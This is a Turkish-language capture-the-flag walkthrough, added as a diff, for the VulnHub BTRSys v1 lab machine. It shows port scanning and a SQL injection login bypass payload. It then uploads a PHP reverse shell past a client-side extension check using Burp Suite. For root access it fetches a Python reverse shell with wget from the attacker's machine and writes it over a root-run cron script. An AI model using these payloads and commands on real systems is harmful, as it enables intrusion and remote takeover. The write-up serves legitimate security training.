@@ -1,0 +1,229 @@
+# BTRSys	V
+
+BTRSysv1	makinesine	linkden	ulaşabilirsiniz.https://www.vulnhub.com/entry/btrsys-v1,195/
+
+Öncelikle	makinenin	ip	adresinini	bulmak	için	aşağıdaki	komutlardan	birini	kullanabiliriz.
+
+1.) arp-scan	--localnet
+2.)	 netdiscover
+
+![ip](images/ip.png)
+
+Hedef	ip	:	10.5.40.183
+
+(NOT: İlerleyen görsellerde ip adresinde farklılıklar olabilir farklı networklerden giriş yaptığım için)
+
+Öncelikle hedefe erişim sağlayabilmek için port taraması yapmamız lazım. nmap aracı ile aşağıdaki gibi portlar taranır.Nmap hedef sistemde açık olan portları ve portlar üzerinde çalışan servisler hakkında bilgi sahibi olmamız sağlayan ağ tarama aracıdır.
+Nmap için detaylı bilgi --> https://nmap.org/book/osdetect-usage.html
+
+![port](images/nmap.png)
+
+ftp:	dosya	paylaşımı	için	açık	olan	port
+http:	Web	sayfası	erişim	portu
+ssh:	uzak	bağlatı	sağlayabileceğimiz	port
+
+Portlardan ilk web sayfasını ve ftp'yi kontrol etmekte fayda var.
+
+
+![web](images/anasayfa.png)
+
+Web	sayfasını	kontrol	edildiğinde	dikkat	çekecek	birşeye	rastlamadım.	Nikto	ve	dirb	aracı	ile	web
+sayfasına	tarama	başlatıldı.	Bu	sırada	açık	portlardan	da	görüleceği	üzere	ftp	de	anonim	kullanıcı
+açıktır.	Browserdan	ftp	ile	bağlandığımda
+ftp://10.5.40.
+
+![ftp](images/ftp.png)
+
+paylaşılmış	olan	bir	dosya	olmadığını	gördük.
+
+![dirb](images/dirb.png)
+
+dirb	web	sayfasını	dizinlerini	tarayan	bir	araçtır.
+
+![nikto](images/nikto.png)
+
+nikto	web	sayfasını	tarayıp	versiyon	vb	işe	yaraması	ihtimal	olan	bilgileri	sunar.
+
+Nikto	ve	dirb'den	elde	edilen	sonuclara	göre;
+/login.php
+/config.php
+/uploads	gibi	dikkat	çeken	birkaç	dizinin	kontrol	edildiğinde
+
+![login](images/loginpage.png)
+
+login.php	sayfasında	kullanıcı	girişi	olduğu	görüldü.
+
+![giris](images/giris2.png)
+
+basit	admin	admin	denemesi	yaptım	ve	kullanıcı	adının	olmağını	söyledi.	Burada	anladığım	ya
+parola	kontrol	edilmiyor	yada	ayrı	ayrı	kontrol	edilip	mesaj	o	şekilde	bastırılıyor	olabilir.
+Standart	SQL	injection	kontrolü	için	tırnak	attığımda	hack	denemesi	uyarısı	verdi.
+
+![girs2](images/hackdenemesi.png)
+
+
+Birkaç	başarısız	SQLinjection	denemesinden	sonra
+
+![deneme](images/girisdeneme.png)
+
+kodları	inceledim	ve	javascript	kodundaki	username	kontrolünde	@btrisk.com	kelimesinin	olması
+gerektiği	gördüm.
+
+![kodlar](images/giris3.png)
+
+
+Parola	için	suan	birşey	yok	fakat	sadece	@btrisk.com	giriş	yapmaya	çalıştığımda	beni
+personel.php	yönlendirdiğini	gördüm.
+
+![oersone](images/personelphp.png)
+
+anladığımkaadarıyla	aslında	bir	parola	kontrolü	yok	kullanıcıyı	atlatmak	yeterli	olacak.	Birkaç	hatalı
+deneme	sonucunda	mysql	hatası	ile	personel.php	açıldığını	gördüm.
+
+![deneme2](images/personelphphata2.png)
+
+Aslında	basit	SQLinjection	yöntem	ile	login	atlatılabilir	sadece	içinde	@btrisk.com'un	da	olması
+gerekiyor.Bunuda	aşağıdaki	payload	ile	başarılı	bir	şekilde	gerçekleşti.
+
+_1'	or	'1=1'	--	@btrisk.com_
+
+![payload](images/payload.png)
+
+NOTE:	SQLinjection	için	detaylı	bilgi	https://www.owasp.org/index.php/SQL_Injection
+
+![basarili](images/basariligirs.png)
+
+
+Personel	listesinin	olduğu	sayfaya	nihayet	giriş	yapabildim	burada	ismail	kullanıcısı	için	bir	dosya
+yükleme	alanı	bırakılmıs	mis	gibi	reverse	shell	kokusu	geliyor	hemen	bir	php	reverse	shell	dosyası
+hazırlayıp	sayfaya	yüklemeye	çalıştım	ama	olmadı.	Bana	sadece	png	ve	jpg	cinsinden	bir	dosya
+yükleyebileğimi	söylüyor	hımm...
+
+![uyari](images/uyari.png)
+
+Linkten	aldığım	php	reverseshell	kodu	kendi	ip	ve	port	bilgilerime	göre	düzenledim. https://github.com/pentestmonkey/php-reverse-shell
+
+![kod](images/kod.png)
+
+Burada	kendi	ip	adresinizi	ve	dinlemek	istediğiniz	port	girmelisiniz.(port	4444	gibi	gözüksede	ben
+8888	i	kullandım.)
+
+Hazırladığım	bu	php	dosyasındaki	.php	uzantısını	.png	yaptım	ama	yine	yemedi	sizde
+deneyebilirsiniz.	Sonra	dedim	acaba	php	mi	kabul	etmiyor	diye	aşağıda	verdiğim	linkteki	diğer
+dillerdeki	shell	kodları	da	yine	.png	uzantılı	şekilde	denedim	ama	olmadı	aslında	ilk	yapmam
+gereken	şey	sonradan	aklıma	geldi.	Sayfanın	kaynak	kodlarına	baktım	javascript	ile	dosya	uzantısı
+kontrol	ediliyor	yani	dosya	sunucuya	gidip	kontrol	edilmiyor	browserda	kontrol	ediliyor	eğer
+uygunsa	sonra	gönderiliyor	yani	gönderilmeden	araya	girip	dosyamızın	uzantısını	değiştirebiliriz.
+
+Ben	bunun	için	BurbSuite	aracını	kullanacağım	(Aşagıdaki	linkten	BurbSuite	ile	ilgili	basit	kullanım
+bilgisine	erişebilirsiniz).
+
+https://www.computerweekly.com/tutorial/Burp-Suite-Guide-Part-I-Basic-tools
+
+BurbSuite	için	proxy	ayarları	gerektiği	gibi	ayarlanıp	istek	yakalandığında	oradan	dosyamızın
+adının	.png	olan	uzantısını	.php	yapıyoruz	ve	gönderiyoruz	görüldüğü	gibi	dosya	yüklendi	diyor.
+
+![burb](images/burb.png)
+
+Bakalım	browserda	da	durumlar	aynı	mı?
+
+![upload](images/dosyayuklendi.png)
+
+Evet	herşey	yolunda	gözüküyor	peki	dosya	nereye	gitti?	Hatırlayalım	dirb	ile	dosya	dizinlerini
+taramıştık	orada	/uploads	diye	bir	dizin	vardı	gidelim	bakalım	dosya	gerçekten	yüklenmiş	mi?
+
+![upload2](images/uploadphp.png)
+
+Gönderdiğimiz	vvvvv.php	dosyası	burada	(diğerlerini	görmezden	gelin	bu	aşamaya	gelene	kadar
+olan	denemelerim	:)	)
+
+Şimdi	ise	yapmamız	gereken	şey	php	dosyamıza	vermiş	olduğumuz	portu	dinlemeye	açıp	dosyaya
+tıklamak	olacak.
+
+![nc](images/nc.png)
+
+Evet	www-data	hesabı	ile	bir	shell	alabildik.	Artık	yetkilerimizi	yükseltmek	için	Linux-post
+exploitation	yöntemlerini	araştırıp	bir	şekilde	root	yetkilerini	almamız	lazım.
+
+Biraz	araştırma	yapalım	bakalım	elimizde	neler	var...
+
+Config.php	dosyasında
+gördüğüm	mysql	bilgileri	ile	bir	bağlantı	gerçekleştirmeyi	deneyelim.
+
+mysql	-u	root	-p 	komutundan	sonra	parola	için	"toor"	u	kullanıyoruz
+
+![mysql](images/mysql.png)
+
+Ama	olmadı	bağlantı	açılmadı	:(	(sizde	deneyin	açılabilir	benimle	ilgi	veya	shell	kod	ile	ilgili	olabilir).
+
+Biz	araştırmalarımıza	devam	edelim.	Verdiğim	linkteki	yöntemleri	kontrol	etmeye	başladım	ve
+yazma	yetkim	olan	dosyaları	araştırdığımda	dikkatimi	çeken	clenar.py	adında	bir	dosya	olduğunu
+gördüm.	(Tabi	bu	aşamaya	kadar	olanları	da	kontrol	ettim	vakit	harcasada	tavsiye	ederim	el
+alıştırıyor.)
+
+##########################	ARA	NOT	################################
+NOTE:	Sanıyorum	ki	işletim	sisteminin	bu	sürümünün	de	exploiti	var	eğer	hiç	birşey	bulamazsam
+son	çare	onu	deneyeceğim	onu	da	şöyle	bulabiliriz.
+
+![uname](images/uname.png)
+
+uname	-a 	komutu	ile	işletim	sisteminin	sürümü	kontrol	edilir.
+
+Exploit	kodun	linkinden	isterseniz	deneme	yapabilirsiniz.
+https://www.exploit-db.com/exploits/37292/
+
+################################################################
+
+Bahsettiğim	yazılabilir	dosyaların	kontrolü	için	aşağıda	ki	kodu	kullandım.
+
+`find	/	-perm	-2	-type	f	2>/dev/null`
+
+![ds](images/dosyaclean.png)
+
+Dosyayı	cat	ile	okuduğumda	tmp	dizinini	temizleyen	bir	python	kodu	olduğunu	gördüm.
+
+![cat](images/catcleaner.png)
+
+
+Anladığım	kadarıyla	bu	kod	zamanlanmış	görevler	içine	çalışıyor	yani	benim	bu	dosyaya
+yazacağım	herhangi	kod	bellibir	süre	sonra	çalışacak.Aynı	zamanda	dosyada	tam	yetkiye	de
+sahibiz.Yani	istediğimiz	bir	kodu	içine	yazabiliriz.	Bakalım	zamanlanmış	görevlerdeki	log
+dosyalarından	kontrol	edecek	olursak.
+
+`cd	/var/log`
+
+`cat	cronlog` //	zamanlanmış	görevlerin	log	dosyası
+
+![cr](images/cronlog.png)
+
+Evet	dosya	2	dk	da	1	kere	bu	python	kodunu	çalıştırıyor(	Crontab	dosyalarına	görev	atama	gibi
+araştırma	yaparak	zamanlanmış	görevler	hakkında	bilgi	sahibi	olabilirsiniz.)
+Hemen	python	ile	root	olabileceğim	kodlar	araştırmaya	başlayalım	bize	buradan	bağlantı
+sağlayacak	bir	reverseshell	code	ile	root	yetkilerine	erişim	sağlayabiliriz	yani	dosyanın	sahibi	root
+ve	biz	bu	dosya	üzerinden	bağlantı	sağlarsak	o	yetkilerle	sağlamış	olacağız.
+
+Şimdi	ki	aşamada	ise	cleaner.py	nin	içine	shell	kod	yazmamız	lazım	ben	kendi	localsunucumdan
+aşağıdaki	linkte	olan	python	kodu	hedef	makineye	indirdim	bunu	da	şu	şekilde	yaptım:
+link-->
+
+`cd	/tmp`
+
+`wget	http://10.5.40.154/py.py`
+
+`cp	py.py	/lib/log/cleaner.py`
+
+bu	şekilde	indirdiğim	kodu	cleaner.py	'nin	içine	attım	kontrol	edelim	gelmiş	mi
+
+![kd](images/catcl.png)
+
+Evet	geldi	şimdi	kendi	makinemizden	7070	portunu	dinlemeye	açıyoruz	ve	2	dk	içinde	bağlantının
+gelmesini	bekliyoruz.
+
+![root](images/root.png)
+
+
+Bu	kadar	artık	tüm	yetkiler	bizde!
+
+NOTE:	Hatırlarsanız	ki	nmap	taramasının	sonucunda	ftp,	ssh	portu	da	açıktı	aynı	zamanda
+aralarda	belirttiğim	farklı	bulgularda	vardı	onları	kullanmadım	elbet	root	olmak	için	farklı	bir	yöntem
+daha	vardır.
